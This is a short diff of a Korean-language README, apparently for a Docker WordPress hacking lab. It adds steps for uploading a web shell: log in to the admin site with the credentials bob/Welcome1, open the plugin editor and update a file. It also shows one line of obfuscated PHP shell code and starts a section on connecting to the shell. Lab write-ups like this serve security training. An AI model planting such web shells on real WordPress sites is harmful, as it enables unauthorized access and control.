@@ -75,7 +75,8 @@ cat shell.php
 > ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/466ade39-1490-4a56-b3d7-ad1a12b9d5aa)
 
 ## 웹쉘 코드 업로드
-- [wordpress admin site] -> [login(bob/Welcome1)] -> 
+- [wordpress admin site] -> [login(bob/Welcome1)] -> [plugins] -> [Editor]
+
 > ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/1db97540-a895-4d8f-915c-5c291598a904)
 
 ```
@@ -95,3 +96,7 @@ $C=$B('',$k);$C();
 
 ```
 
+- [Update File]
+
+## 웹쉘 연결
+- 
